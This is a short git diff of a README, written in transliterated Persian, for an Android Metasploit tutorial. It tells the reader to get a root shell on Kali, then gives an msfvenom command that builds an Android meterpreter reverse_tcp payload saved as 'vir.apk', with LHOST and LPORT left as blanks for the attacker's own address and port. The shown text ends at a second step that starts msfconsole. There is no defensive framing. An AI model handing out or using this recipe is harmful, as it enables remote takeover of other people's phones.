@@ -1,10 +1,19 @@
-# Android-MetaSploit-Sade
+### Script `Android-MetaSploit-Sade`
 
-┌──(root㉿kali)-[~]   
-  
-1) msfvenom -p android/meterpreter/reverse_tcp LHOST=* LPORT=** -o /home/kali/Desktop/vir.apk
+$ Kali linux bayad dar halat root bashad
 
-{{{{ * = ifconfig      **= پورت دلخواه }}}}
+```bash
+sudo -s
+```
+
+$ "LHOST" va "LPORT" ra jaygozari va enter mikonim (*=ifcongig / **= port delkhah )
+
+```bash
+msfvenom -p android/meterpreter/reverse_tcp LHOST=* LPORT=** -o /home/kali/Desktop/vir.apk
+```
+
+
+
 
 2) msfconsole
 
